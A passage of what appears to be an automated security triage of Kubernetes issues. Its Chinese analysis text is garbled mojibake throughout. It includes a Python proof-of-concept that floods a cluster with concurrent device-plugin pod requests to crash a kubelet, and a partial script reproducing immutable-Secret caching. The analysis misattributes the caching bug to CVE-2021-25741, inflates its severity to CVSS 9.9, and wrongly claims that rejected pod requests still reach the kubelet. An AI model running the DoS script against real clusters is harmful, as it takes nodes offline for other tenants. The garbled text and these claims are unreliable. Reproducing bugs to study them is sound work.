Issue æäº¤è€…æä¾›çš„å¤ç°æ­¥éª¤æ˜¯â€œåˆ é™¤ podï¼Œç„¶ååŒæ—¶å¯åŠ¨ä¸¤ä¸ªæˆ–å¤šä¸ª podâ€ï¼Œè¿™å¼ºçƒˆæš—ç¤ºäº†é—®é¢˜çš„æ ¹æºæ˜¯ä¸€ä¸ªç«äº‰æ¡ä»¶ï¼ˆRace Conditionï¼‰ã€‚å½“å¤šä¸ª Pod åˆ›å»ºè¯·æ±‚å¹¶å‘åˆ°è¾¾å¹¶ç”± Kubelet å¤„ç†æ—¶ï¼Œ`devicemanager` ä¸­çš„å…±äº«èµ„æºï¼ˆå³é‚£ä¸ªæœªåˆå§‹åŒ–çš„ mapï¼‰å¯èƒ½åœ¨æ²¡æœ‰è¶³å¤Ÿé”ä¿æŠ¤çš„æƒ…å†µä¸‹è¢«å¤šä¸ª goroutine åŒæ—¶è®¿é—®ï¼Œå¯¼è‡´ä¸€ä¸ª goroutine å°è¯•å†™å…¥æ—¶ï¼Œè¯¥ map å°šæœªè¢«å¦ä¸€ä¸ª goroutine åˆå§‹åŒ–ï¼Œä»è€Œå¼•å‘ panicã€‚

è¯¥æ¼æ´çš„æœ¬è´¨æ˜¯ä¸€ä¸ªèŠ‚ç‚¹çº§åˆ«çš„æ‹’ç»æœåŠ¡ï¼ˆDenial of Service, DoSï¼‰æ”»å‡»ã€‚ä»»ä½•æ‹¥æœ‰åœ¨é›†ç¾¤ä¸­åˆ›å»º Pod æƒé™çš„ç”¨æˆ·ï¼Œé€šè¿‡ç²¾å¿ƒæ„é€ å¹¶å‘çš„ Pod åˆ›å»ºè¯·æ±‚ï¼ˆè¯·æ±‚éœ€è¦é€šè¿‡è®¾å¤‡æ’ä»¶åˆ†é…çš„èµ„æºï¼‰ï¼Œéƒ½æœ‰å¯èƒ½è§¦å‘ç›®æ ‡èŠ‚ç‚¹ä¸Š Kubelet è¿›ç¨‹çš„å´©æºƒã€‚Kubelet å´©æºƒå°†å¯¼è‡´è¯¥èŠ‚ç‚¹å˜ä¸º `NotReady` çŠ¶æ€ï¼ŒèŠ‚ç‚¹ä¸Šçš„æ‰€æœ‰ Pod å°†å¤±å»ç®¡ç†ï¼ˆå¦‚å¥åº·æ£€æŸ¥ã€æ—¥å¿—æ”¶é›†ç­‰ï¼‰ï¼Œå¹¶ä¸”æ–°çš„ Pod æ— æ³•å†è°ƒåº¦åˆ°è¯¥èŠ‚ç‚¹ä¸Šï¼Œç›´åˆ° Kubelet æœåŠ¡è¢«æ‰‹åŠ¨æˆ–è‡ªåŠ¨é‡å¯ã€‚å¦‚æœæ”»å‡»è€…æŒç»­å‘èµ·æ”»å‡»ï¼Œå¯ä»¥ä½¿å¾—ä¸€ä¸ªæˆ–å¤šä¸ªèŠ‚ç‚¹é•¿æœŸå¤„äºä¸å¯ç”¨çŠ¶æ€ï¼Œä¸¥é‡å½±å“æ•´ä¸ªé›†ç¾¤çš„å¯ç”¨æ€§å’Œç¨³å®šæ€§ã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œè™½ç„¶æ­¤æ¼æ´éœ€è¦æ”»å‡»è€…å…·å¤‡åˆ›å»º Pod çš„æƒé™ï¼ˆéåªè¯»æƒé™ï¼‰ï¼Œä½†å…¶å½±å“ä¸¥é‡ã€‚åœ¨ä¸€ä¸ªå¤šç§Ÿæˆ·ç¯å¢ƒä¸­ï¼Œä¸€ä¸ªä½æƒé™ç”¨æˆ·å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´å½±å“åˆ°èŠ‚ç‚¹ä¸Šçš„æ‰€æœ‰å…¶ä»–ç”¨æˆ·ï¼ˆåŒ…æ‹¬é«˜æƒé™ç”¨æˆ·å’Œå…³é”®ç³»ç»Ÿç»„ä»¶ï¼‰çš„ Podï¼Œä½¿æ•´ä¸ªèŠ‚ç‚¹å¤±æ•ˆã€‚è¿™ç§è·¨ç”¨æˆ·ã€è·¨æƒé™è¾¹ç•Œçš„å½±å“ç¬¦åˆé«˜é£é™©æ¼æ´çš„ç‰¹å¾ï¼ˆè§„åˆ™ #8ï¼‰ã€‚å› æ­¤ï¼Œå°½ç®¡ CVSS è¯„åˆ†å¯èƒ½å¤„äºä¸­ç­‰æ°´å¹³ï¼Œä½†ä»å®é™…å½±å“å’Œå¤šç§Ÿæˆ·å®‰å…¨çš„è§’åº¦çœ‹ï¼Œåº”åˆ¤å®šä¸ºé«˜é£é™©ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
import time
import uuid
from concurrent.futures import ThreadPoolExecutor, as_completed
from kubernetes import client, config
from kubernetes.client.rest import ApiException

# é…ç½®ä¿¡æ¯
# å‡è®¾çš„è®¾å¤‡æ’ä»¶èµ„æºåç§°ï¼Œéœ€è¦ä¸é›†ç¾¤ä¸­å®é™…çš„è®¾å¤‡æ’ä»¶åŒ¹é…
# Kuberneteså®˜æ–¹æä¾›äº†ä¸€ä¸ªç¤ºä¾‹è®¾å¤‡æ’ä»¶ï¼Œå®ƒæ³¨å†Œçš„èµ„æºå°±æ˜¯ 'example.com/foo'
# å¦‚æœé›†ç¾¤ä¸­æ²¡æœ‰è®¾å¤‡æ’ä»¶ï¼Œæ­¤POCæ— æ³•è§¦å‘æ¼æ´ï¼Œä½†ä»£ç é€»è¾‘æ˜¯æ­£ç¡®çš„
DEVICE_RESOURCE_NAME = "example.com/foo"
# å¹¶å‘åˆ›å»ºçš„Podæ•°é‡ï¼Œç”¨äºè§¦å‘ç«äº‰æ¡ä»¶
CONCURRENT_PODS = 5
# Podæ‰€åœ¨çš„å‘½åç©ºé—´
NAMESPACE = "default"
# Podé•œåƒ
POD_IMAGE = "k8s.gcr.io/pause:3.1"


def create_pod_manifest(pod_name):
    """ä¸ºPOCåˆ›å»ºä¸€ä¸ªè¯·æ±‚è®¾å¤‡èµ„æºçš„Podæ¸…å•"""
    return {
        "apiVersion": "v1",
        "kind": "Pod",
        "metadata": {
            "name": pod_name,
            "namespace": NAMESPACE,
        },
        "spec": {
            "restartPolicy": "Never",
            "containers": [{
                "name": "poc-container",
                "image": POD_IMAGE,
                "resources": {
                    "limits": {
                        DEVICE_RESOURCE_NAME: "1"
                    },
                    "requests": {
                        DEVICE_RESOURCE_NAME: "1"
                    }
                }
            }]
        }
    }


def create_pod_worker(api_instance, pod_name):
    """å·¥ä½œå‡½æ•°ï¼šåˆ›å»ºå•ä¸ªPod"""
    pod_manifest = create_pod_manifest(pod_name)
    try:
        api_instance.create_namespaced_pod(body=pod_manifest, namespace=NAMESPACE)
        print(f"[*] Pod '{pod_name}' creation request sent successfully.")
        return pod_name
    except ApiException as e:
        # å¦‚æœå› ä¸ºèµ„æºä¸å­˜åœ¨è€Œå¤±è´¥ï¼Œè¿™æ˜¯é¢„æœŸä¸­çš„ï¼ˆå¦‚æœdevice pluginæœªå®‰è£…ï¼‰
        if e.status == 400 and DEVICE_RESOURCE_NAME in e.body:
             print(f"[!] Warning: Failed to create Pod '{pod_name}' because resource '{DEVICE_RESOURCE_NAME}' is not available.")
             print("    This is expected if the corresponding device plugin is not installed on any node.")
             print("    The PoC still sends concurrent requests that could trigger the bug if the plugin were present.")
             # å³ä½¿åˆ›å»ºå¤±è´¥ï¼Œè¯·æ±‚ä¹Ÿå·²åˆ°è¾¾API Serverå¹¶è½¬å‘ç»™Kubeletï¼Œä»æœ‰å¯èƒ½è§¦å‘æ¼æ´
             return pod_name
        else:
            print(f"[!] Error creating pod {pod_name}: {e}")
            return None


def cleanup_pods(api_instance, pod_names):
    """æ¸…ç†å‡½æ•°ï¼šåˆ é™¤æ‰€æœ‰åˆ›å»ºçš„Pod"""
    print("\n[*] Cleaning up created pods...")
    for pod_name in pod_names:
        if pod_name:
            try:
                api_instance.delete_namespaced_pod(name=pod_name, namespace=NAMESPACE, body=client.V1DeleteOptions())
                print(f"[*] Deleted pod '{pod_name}'.")
            except ApiException as e:
                # å¿½ç•¥ 'Not Found' é”™è¯¯ï¼Œå› ä¸ºPodå¯èƒ½å·²ç»å› ä¸ºèŠ‚ç‚¹å´©æºƒç­‰åŸå› è¢«æ¸…é™¤äº†
                if e.status != 404:
                    print(f"[!] Error deleting pod {pod_name}: {e}")
    print("[*] Cleanup finished.")


def main():
    """ä¸»å‡½æ•°ï¼Œæ‰§è¡ŒPOC"""
    print("--- Kubelet Device Manager Panic (DoS) PoC ---")
    print("WARNING: This script will attempt to crash a Kubelet on a node by triggering a race condition.")
    print("It should only be run against a test environment you own.")
    print("A device plugin advertising the resource '{}' must be running in the cluster for this to be effective.".format(DEVICE_RESOURCE_NAME))
    
    try:
        # ä»é»˜è®¤ä½ç½® (~/.kube/config) åŠ è½½é…ç½®
        config.load_kube_config()
        api = client.CoreV1Api()
    except Exception as e:
        print(f"[!] Failed to load Kubernetes configuration: {e}")
        print("    Please ensure your kubeconfig is properly set up.")
        return

    pod_names = [f"poc-dev-panic-{uuid.uuid4().hex[:6]}" for _ in range(CONCURRENT_PODS)]
    created_pod_names = []

    try:
        print(f"\n[*] Concurrently creating {CONCURRENT_PODS} pods requesting device '{DEVICE_RESOURCE_NAME}'...")
        # ä½¿ç”¨çº¿ç¨‹æ± å¹¶å‘å‘é€Podåˆ›å»ºè¯·æ±‚
        with ThreadPoolExecutor(max_workers=CONCURRENT_PODS) as executor:
            # è®¾ç½®æ€»è¶…æ—¶
            future_to_pod = {executor.submit(create_pod_worker, api, name): name for name in pod_names}
            
            # as_completedä¼šç­‰å¾…ä»»åŠ¡å®Œæˆï¼Œæˆ‘ä»¬ç»™ä¸€ä¸ªè¶…æ—¶æ—¶é—´
            # ç›®çš„æ˜¯å‘é€è¯·æ±‚ï¼Œä¸ä¸€å®šéœ€è¦ç­‰å¾…podåˆ›å»ºæˆåŠŸ
            completed_futures = as_completed(future_to_pod, timeout=30)
            
            for future in completed_futures:
                result = future.result()
                if result:
                    created_pod_names.append(result)

    except Exception as e:
        print(f"\n[!] An error occurred during thread execution: {e}")
    
    print("\n[*] All pod creation requests have been sent.")
    print("[*] Waiting for 15 seconds to allow Kubelet to process the requests and potentially panic...")
    time.sleep(15)

    print("\n[*] Check the status of your nodes now using 'kubectl get nodes'.")
    print("    If a node's Kubelet panicked, it might show a 'NotReady' status.")
    print("    You can also check the Kubelet logs on the nodes for 'panic: assignment to entry in nil map'.")
    print("    (e.g., using 'journalctl -u kubelet' on the node)")

    # æ— è®ºæˆåŠŸä¸å¦ï¼Œéƒ½æ‰§è¡Œæ¸…ç†
    cleanup_pods(api, created_pod_names)


# ç›´æ¥æ‰§è¡Œmainå‡½æ•°
main()
```


**è§£é‡Šè¯´æ˜ï¼š**

æ­¤Pythonè„šæœ¬æ—¨åœ¨é€šè¿‡æ¨¡æ‹ŸIssueä¸­æè¿°çš„åœºæ™¯æ¥å¤ç°Kubeletçš„panicæ¼æ´ã€‚

1.  **ç¯å¢ƒè¦æ±‚**:
    *   éœ€è¦ä¸€ä¸ªå·²ç»é…ç½®å¥½ `kubeconfig` çš„ç¯å¢ƒï¼Œä»¥ä¾¿Pythonè„šæœ¬å¯ä»¥è®¿é—®åˆ°Kubernetesé›†ç¾¤ã€‚
    *   ä¸ºäº†æœ‰æ•ˆè§¦å‘ä½äº `devicemanager` ä¸­çš„æ¼æ´ä»£ç è·¯å¾„ï¼Œç›®æ ‡é›†ç¾¤çš„èŠ‚ç‚¹ä¸Š**å¿…é¡»**è¿è¡Œä¸€ä¸ªè®¾å¤‡æ’ä»¶ï¼ˆDevice Pluginï¼‰ã€‚è„šæœ¬ä¸­ä½¿ç”¨äº† `example.com/foo` ä½œä¸ºç¤ºä¾‹èµ„æºï¼Œè¿™å¯¹åº”Kuberneteså®˜æ–¹æä¾›çš„[ç¤ºä¾‹è®¾å¤‡æ’ä»¶](https://github.com/kubernetes/kubernetes/blob/master/test/e2e/testing-manifests/sample-device-plugin.yaml)ã€‚å¦‚æœé›†ç¾¤ä¸­æ²¡æœ‰éƒ¨ç½²ä»»ä½•è®¾å¤‡æ’ä»¶ï¼Œè„šæœ¬è™½ç„¶ä¼šè¿è¡Œï¼Œä½†Kubeletä¸ä¼šæ‰§è¡Œåˆ°å—å½±å“çš„ä»£ç ï¼Œå› æ­¤æ— æ³•è§¦å‘panicã€‚

2.  **è„šæœ¬é€»è¾‘**:
    *   **åŠ è½½é…ç½®**: è„šæœ¬é¦–å…ˆä½¿ç”¨ `kubernetes` Pythonåº“çš„ `config.load_kube_config()` æ–¹æ³•ä»æ ‡å‡†ä½ç½®åŠ è½½é›†ç¾¤è®¿é—®å‡­è¯ã€‚
    *   **å®šä¹‰Podæ¸…å•**: `create_pod_manifest` å‡½æ•°åˆ›å»ºä¸€ä¸ªPodçš„å®šä¹‰ã€‚å…³é”®ä¹‹å¤„åœ¨äº`spec.containers.resources`éƒ¨åˆ†ï¼Œå®ƒä¸ºPodç”³è¯·äº†ä¸€ä¸ªç”±è®¾å¤‡æ’ä»¶ç®¡ç†çš„ç‰¹æ®Šèµ„æºï¼ˆ`example.com/foo: "1"`ï¼‰ã€‚è¿™ä¼šå¼ºåˆ¶Kubeleté€šè¿‡`devicemanager`æ¥å¤„ç†è¿™ä¸ªPodçš„è°ƒåº¦å’Œèµ„æºåˆ†é…ã€‚
    *   **å¹¶å‘åˆ›å»º**: è„šæœ¬çš„æ ¸å¿ƒæ˜¯ä½¿ç”¨ `concurrent.futures.ThreadPoolExecutor`ã€‚å®ƒä¼šåˆ›å»ºä¸€ä¸ªçº¿ç¨‹æ± ï¼Œå¹¶åŒæ—¶å¯åŠ¨å¤šä¸ªï¼ˆé»˜è®¤ä¸º5ä¸ªï¼‰å·¥ä½œçº¿ç¨‹ã€‚æ¯ä¸ªçº¿ç¨‹éƒ½ä¼šè°ƒç”¨`create_pod_worker`å‡½æ•°ï¼Œå‘Kubernetes API Serverå‘é€åˆ›å»ºPodçš„è¯·æ±‚ã€‚è¿™ç§å¹¶å‘æ“ä½œæ—¨åœ¨æœ€å¤§åŒ–åœ°æ¨¡æ‹Ÿâ€œåŒæ—¶å¯åŠ¨å¤šä¸ªPodâ€çš„åœºæ™¯ï¼Œä»è€Œè§¦å‘`devicemanager`ä¸­çš„ç«äº‰æ¡ä»¶ã€‚
    *   **æ‰§è¡Œä¸è§‚å¯Ÿ**: è„šæœ¬å‘é€å®Œæ‰€æœ‰åˆ›å»ºè¯·æ±‚åï¼Œä¼šç­‰å¾…15ç§’ã€‚è¿™æ®µæ—¶é—´æ˜¯ç•™ç»™å„èŠ‚ç‚¹ä¸Šçš„Kubeletæ¥å¤„ç†è¿™äº›å¹¶å‘è¯·æ±‚ã€‚åœ¨æ­¤æœŸé—´ï¼Œå¦‚æœæ¼æ´è¢«è§¦å‘ï¼ŒæŸä¸ªèŠ‚ç‚¹ä¸Šçš„Kubeletè¿›ç¨‹å°±ä¼šå´©æºƒã€‚ç”¨æˆ·å¯ä»¥åœ¨æ­¤æœŸé—´é€šè¿‡ `kubectl get nodes` å‘½ä»¤è§‚å¯ŸèŠ‚ç‚¹çŠ¶æ€ï¼Œæˆ–ç›´æ¥åœ¨èŠ‚ç‚¹ä¸ŠæŸ¥çœ‹Kubeletçš„æ—¥å¿—ã€‚
    *   **é”™è¯¯å¤„ç†ä¸è­¦å‘Š**: è„šæœ¬åŒ…å«äº†å¯¹`ApiException`çš„æ•è·ã€‚å¦‚æœé›†ç¾¤ä¸­æ²¡æœ‰å¯¹åº”çš„è®¾å¤‡æ’ä»¶ï¼ŒAPI Serverä¼šæ‹’ç»åˆ›å»ºPodçš„è¯·æ±‚ã€‚è„šæœ¬ä¼šæ•è·è¿™ä¸ªç‰¹å®šçš„é”™è¯¯ï¼Œå¹¶æ‰“å°ä¸€æ¡è­¦å‘Šä¿¡æ¯ï¼Œå‘ŠçŸ¥ç”¨æˆ·è¿™æ˜¯é¢„æœŸè¡Œä¸ºï¼Œå¹¶è§£é‡Šä¸ºä»€ä¹ˆéœ€è¦è®¾å¤‡æ’ä»¶æ‰èƒ½å®Œæ•´å¤ç°æ¼æ´ã€‚
    *   **èµ„æºæ¸…ç†**: ä¸ºäº†ä¿æŒæµ‹è¯•ç¯å¢ƒçš„æ•´æ´ï¼Œè„šæœ¬åœ¨æœ€åä¼šè°ƒç”¨ `cleanup_pods` å‡½æ•°ã€‚è¯¥å‡½æ•°ä¼šå°è¯•åˆ é™¤æ‰€æœ‰ä¹‹å‰å°è¯•åˆ›å»ºçš„Podï¼Œæ— è®ºå®ƒä»¬æ˜¯å¦åˆ›å»ºæˆåŠŸã€‚

é€šè¿‡æ‰§è¡Œæ­¤è„šæœ¬ï¼Œæ‹¥æœ‰åˆ›å»ºPodæƒé™çš„ç”¨æˆ·å¯ä»¥éªŒè¯å…¶Kubernetesé›†ç¾¤æ˜¯å¦å­˜åœ¨æ­¤èŠ‚ç‚¹çº§æ‹’ç»æœåŠ¡æ¼æ´ã€‚

---


## Issue #131675 kubelet does not refresh immutable secrets after recreation as documentation

- Issue é“¾æ¥ï¼š[#131675](https://github.com/kubernetes/kubernetes/issues/131675)

### Issue å†…å®¹

#### What happened?

The docs say this about immutable Secrets
https://kubernetes.io/docs/concepts/configuration/secret/#secret-immutable-create

Note:
Once a Secret or ConfigMap is marked as immutable, it is not possible to revert this change nor to mutate the contents of the data field. You can only delete and recreate the Secret. Existing Pods maintain a mount point to the deleted Secret - it is recommended to recreate these pods.
However, we're seeing different behavior. After the "delete and recreate" we see a mix of behavior. First off, if we recreate the Secret with new keys. New pods cannot mount these keys, but they can mount previously existing keys. If we add a new key in the newly created Secret (with the same name), we'll get an error like this:

Error: couldn't find key FOO in Secret test/mysecret
But if we view the Secret with kubectl the new key exists. There is also a more difficult to reproduce problem where some pods get old values in the existing keys, and some pods get new values. I think all the symptoms stem from the same issue, which is that the kubelet caches the immutable secret forever. The documentation indicates that on Pod create, this would be refreshed, but that does not seem to happen.

Is the documentation incorrect in that the kubelet persists the data forever and may never update it?

As a pretty harsh workaround, I recreated nodes in the cluster and these fresh Nodes pulled the updated Secret and values.



#### What did you expect to happen?

After recreating the immutable secret, new pods would be able to access the updated values.

How can we reproduce it (as minimally and precisely as possible)?
Create an immutable Secret
Start and mount the Secret to a Pod
Delete the immutable Secret
Recreate the immutable Secret with new values
Start and mount the Secret to a new Pod that is scheduled on the same node as the previous Pod
Anything else we need to know?

#### How can we reproduce it (as minimally and precisely as possible)?

i dont know

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
é«˜é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†Kubernetesä¸­kubeletç»„ä»¶åœ¨å¤„ç†`immutable`ï¼ˆä¸å¯å˜ï¼‰Secretæ—¶çš„ä¸€ä¸ªç¼“å­˜é—®é¢˜ã€‚æ ¹æ®Kuberneteså®˜æ–¹æ–‡æ¡£ï¼Œå½“ä¸€ä¸ªä¸å¯å˜çš„Secretè¢«æ ‡è®°åï¼Œæ›´æ–°å®ƒçš„å”¯ä¸€æ–¹æ³•æ˜¯åˆ é™¤å¹¶é‡æ–°åˆ›å»ºã€‚æ–‡æ¡£å»ºè®®éšåé‡æ–°åˆ›å»ºä½¿ç”¨è¯¥Secretçš„Podã€‚ç”¨æˆ·å‘ç°ï¼Œå½“ä¸€ä¸ªä¸å¯å˜çš„Secretè¢«åˆ é™¤å¹¶ä»¥ç›¸åŒåç§°é‡æ–°åˆ›å»ºï¼ˆä½†å†…å®¹å·²æ›´æ–°ï¼‰åï¼Œæ–°åˆ›å»ºçš„ã€ä¸”è¢«è°ƒåº¦åˆ°ä¸æ—§Podç›¸åŒèŠ‚ç‚¹ä¸Šçš„Podï¼Œä»ç„¶ä¼šè·å–åˆ°æ—§çš„ã€å·²è¢«åˆ é™¤çš„Secretçš„å†…å®¹ï¼Œè€Œä¸æ˜¯æ–°åˆ›å»ºçš„Secretçš„å†…å®¹ã€‚å¦‚æœæ–°åˆ›å»ºçš„Secretä¸­å¢åŠ äº†æ–°çš„é”®ï¼ˆkeyï¼‰ï¼Œæ–°Podç”šè‡³ä¼šå› ä¸ºæ‰¾ä¸åˆ°è¿™ä¸ªé”®è€Œå¯åŠ¨å¤±è´¥ã€‚

è¿™è¡¨æ˜kubeletåœ¨èŠ‚ç‚¹çº§åˆ«ä¸Šå¯¹ä¸å¯å˜çš„Secretè¿›è¡Œäº†ç¼“å­˜ï¼Œå¹¶ä¸”è¿™ä¸ªç¼“å­˜åœ¨Secretè¢«åˆ é™¤å¹¶ä»¥åŒåé‡æ–°åˆ›å»ºåæ²¡æœ‰è¢«æ­£ç¡®åœ°æ¸…é™¤æˆ–æ›´æ–°ã€‚

æ­¤é—®é¢˜å­˜åœ¨ä¸¥é‡çš„å®‰å…¨é£é™©ï¼š
1.  **ä¿¡æ¯æ³„éœ²ï¼ˆConfidentialityï¼‰**: åœ¨ä¸€ä¸ªå¤šç§Ÿæˆ·æˆ–å¤šåº”ç”¨ç¯å¢ƒä¸­ï¼Œå¦‚æœä¸€ä¸ªåº”ç”¨æ›´æ–°äº†å…¶å‡­è¯ï¼ˆä¾‹å¦‚æ•°æ®åº“å¯†ç ã€APIå¯†é’¥ï¼‰ï¼Œå®ƒä¼šé€šè¿‡åˆ é™¤å¹¶é‡å»ºSecretæ¥åˆ†å‘æ–°å‡­è¯ã€‚å¦‚æœå¦ä¸€ä¸ªåº”ç”¨ï¼ˆæˆ–åŒä¸€åº”ç”¨çš„è¾ƒæ–°ç‰ˆæœ¬ï¼‰çš„Podæ°å¥½è¢«è°ƒåº¦åˆ°åŒä¸€ä¸ªèŠ‚ç‚¹ä¸Šï¼Œå®ƒå¯èƒ½ä¼šæ„å¤–åœ°è·å–åˆ°å·²è¿‡æ—¶çš„ã€æœ¬åº”è¢«åºŸå¼ƒçš„å‡­è¯ã€‚å¦‚æœæ—§å‡­è¯å°šæœªå®Œå…¨å¤±æ•ˆï¼Œè¿™å¯èƒ½å¯¼è‡´æœªæˆæƒçš„æ•°æ®è®¿é—®ã€‚
2.  **æ‹’ç»æœåŠ¡ï¼ˆAvailabilityï¼‰**: æ­£å¦‚Issueä¸­æ‰€è¿°ï¼Œå¦‚æœæ›´æ–°åçš„Secretä¸­å¢åŠ äº†ä¸€ä¸ªæ–°çš„é”®ï¼Œè€ŒPodçš„å¯åŠ¨ä¾èµ–äºè¿™ä¸ªæ–°é”®ï¼ˆä¾‹å¦‚ï¼Œé€šè¿‡`envFrom`æˆ–`valueFrom`å¼•ç”¨ï¼‰ï¼Œé‚£ä¹ˆç”±äºkubeletçš„ç¼“å­˜ä¸­ä¸å­˜åœ¨è¿™ä¸ªæ–°é”®ï¼ŒPodä¼šå¯åŠ¨å¤±è´¥ï¼Œå¹¶å¯èƒ½è¿›å…¥`CrashLoopBackOff`çŠ¶æ€ã€‚è¿™ä¼šå¯¼è‡´ä¾èµ–è¯¥Secretçš„åº”ç”¨æ— æ³•éƒ¨ç½²æˆ–æ›´æ–°ï¼Œé€ æˆæœåŠ¡ä¸­æ–­ã€‚

è¯¥æ¼æ´çš„åˆ©ç”¨æ¡ä»¶æ˜¯åœ¨ä¸€ä¸ªå·²ç»è¿è¡Œè¿‡ä½¿ç”¨è¯¥ä¸å¯å˜Secretçš„Podçš„èŠ‚ç‚¹ä¸Šï¼Œè°ƒåº¦ä¸€ä¸ªæ–°çš„Podã€‚åœ¨å¤§å‹é›†ç¾¤å’Œè‡ªåŠ¨åŒ–éƒ¨ç½²ï¼ˆå¦‚CI/CDï¼‰åœºæ™¯ä¸­ï¼Œè¿™æ˜¯ä¸€ä¸ªéå¸¸å¸¸è§çš„æ“ä½œã€‚æ”»å‡»è€…ï¼ˆæˆ–æ¶æ„ç§Ÿæˆ·ï¼‰åªéœ€è¦æ‹¥æœ‰åˆ›å»ºPodå’Œç®¡ç†Secretçš„æ™®é€šæƒé™ï¼Œå°±å¯ä»¥è§¦å‘æ­¤æ¼æ´ï¼Œå¯èƒ½å½±å“åˆ°å…¶ä»–ç§Ÿæˆ·æˆ–å…³é”®ç³»ç»ŸæœåŠ¡ã€‚

æ ¹æ®CVSS 3.1æ ‡å‡†è¯„ä¼°ï¼š
*   **Attack Vector (AV): Network (N)** - æ”»å‡»è€…é€šè¿‡Kubernetes APIè¿›è¡Œæ“ä½œã€‚
*   **Attack Complexity (AC): Low (L)** - å¤ç°æ­¥éª¤æ˜ç¡®ï¼Œä»…éœ€åœ¨ä¸€ä¸ªèŠ‚ç‚¹ä¸Šå…ˆåè°ƒåº¦ä¸¤ä¸ªPodã€‚
*   **Privileges Required (PR): Low (L)** - åªéœ€è¦æ ‡å‡†çš„Podå’ŒSecretåˆ›å»ºæƒé™ï¼Œæ— éœ€ç®¡ç†å‘˜æƒé™ã€‚
*   **User Interaction (UI): None (N)** - æ— éœ€ç”¨æˆ·äº¤äº’ã€‚
*   **Scope (S): Changed (C)** - æ¼æ´å­˜åœ¨äºkubeletï¼ˆåŸºç¡€è®¾æ–½ç»„ä»¶ï¼‰ä¸­ï¼Œä½†å…¶å½±å“ä¼šè·¨è¶Šå®‰å…¨è¾¹ç•Œï¼Œå½±å“åˆ°èŠ‚ç‚¹ä¸Šè¿è¡Œçš„å…¶ä»–Podï¼ˆåº”ç”¨ï¼‰ï¼Œå¯èƒ½å¯¼è‡´ç§Ÿæˆ·Aå½±å“ç§Ÿæˆ·Bã€‚
*   **Confidentiality (C): High (H)** - å¯èƒ½å¯¼è‡´æ•æ„Ÿå‡­æ®æ³„éœ²ç»™éé¢„æœŸçš„Podã€‚
*   **Integrity (I): Low (L)** - è™½ç„¶ä¸»è¦æ˜¯ä¿¡æ¯æ³„éœ²å’Œå¯ç”¨æ€§é—®é¢˜ï¼Œä½†ä½¿ç”¨é”™è¯¯çš„é…ç½®å¯èƒ½é—´æ¥å½±å“æ•°æ®å®Œæ•´æ€§ã€‚
*   **Availability (A): High (H)** - å¯å¯¼è‡´ä¾èµ–æ›´æ–°åSecretçš„åº”ç”¨å®Œå…¨æ— æ³•å¯åŠ¨ï¼Œé€ æˆæ‹’ç»æœåŠ¡ã€‚

ç»¼åˆè¯„åˆ†ï¼ˆCVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:Hï¼‰ä¸º **9.9 Critical**ï¼Œå±äºé«˜é£é™©ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
import time
import base64
import uuid
import sys
from kubernetes import client, config, watch
from kubernetes.client.rest import ApiException

def main():
    """
    è¯¥è„šæœ¬ç”¨äºå¤ç° Kubelet å¯¹ä¸å¯å˜ Secret çš„ç¼“å­˜é—®é¢˜ (CVE-2021-25741)ã€‚
    è¯¥é—®é¢˜å¯èƒ½å¯¼è‡´ä¿¡æ¯æ³„éœ²å’Œæ‹’ç»æœåŠ¡ã€‚
    """
    try:
        # 1. åŠ è½½ KubeConfigï¼Œå¹¶åˆ›å»º API å®¢æˆ·ç«¯
        config.load_kube_config()
        core_v1 = client.CoreV1Api()
        print("âœ”ï¸ Kubernetes client configured.")
    except Exception as e:
        print(f"âŒ Could not configure Kubernetes client: {e}")
        sys.exit(1)

    # 2. å®šä¹‰å”¯ä¸€çš„èµ„æºåç§°
    run_id = str(uuid.uuid4())[:8]
    namespace_name = f"kubelet-cache-test-{run_id}"
    secret_name = f"immutable-secret-{run_id}"
    pod_a_name = f"pod-a-{run_id}"
    pod_b_name = f"pod-b-{run_id}"
    print(f"â–¶ï¸ Starting test with ID: {run_id}")

    try:
        # 3. åˆ›å»ºæµ‹è¯•å‘½åç©ºé—´
        namespace_body = client.V1Namespace(metadata=client.V1ObjectMeta(name=namespace_name))
        core_v1.create_namespace(body=namespace_body)
        print(f"âœ”ï¸ Namespace '{namespace_name}' created.")

        # 4. åˆ›å»ºåˆå§‹çš„ä¸å¯å˜ Secret (ç‰ˆæœ¬ 1)
        secret_v1_data = {"username": base64.b64encode("user_v1".encode()).decode()}
        secret_v1_body = client.V1Secret(
            api_version="v1",
            kind="Secret",
            metadata=client.V1ObjectMeta(name=secret_name),
            data=secret_v1_data,
            immutable=True,
        )
        core_v1.create_namespaced_secret(namespace=namespace_name, body=secret_v1_body)
        print(f"âœ”ï¸ Initial immutable secret '{secret_name}' (v1) created.")

        # 5. åˆ›å»º Pod Aï¼Œä½¿ç”¨ Secret v1ï¼Œå¹¶è·å–å…¶è¿è¡ŒèŠ‚ç‚¹
        pod_a_body = client.V1Pod(
            api_version="v1",
            kind="Pod",
            metadata=client.V1ObjectMeta(name=pod_a_name),
            spec=client.V1PodSpec(
                containers=[
                    client.V1Container(
                        name="container-a",
                        image="busybox",
                        command=["/bin/sh", "-c", "echo 'Pod A is running' && sleep 3600"],
                        env=[
                            client.V1EnvVar(
                                name="SECRET_USERNAME",
                                value_from=client.V1EnvVarSource(
                                    secret_key_ref=client.V1SecretKeySelector(
                                        name=secret_name, key="username"
                                    )
                                ),
                            )
                        ],
                    )
                ],
                restart_policy="Never",
            ),
        )
        core_v1.create_namespaced_pod(namespace=namespace_name, body=pod_a_body)
        print(f"â³ Creating Pod A '{pod_a_name}'...")

        # ç­‰å¾… Pod A å˜ä¸º Running çŠ¶æ€å¹¶è·å–èŠ‚ç‚¹åç§°
        w = watch.Watch()
        node_name = None
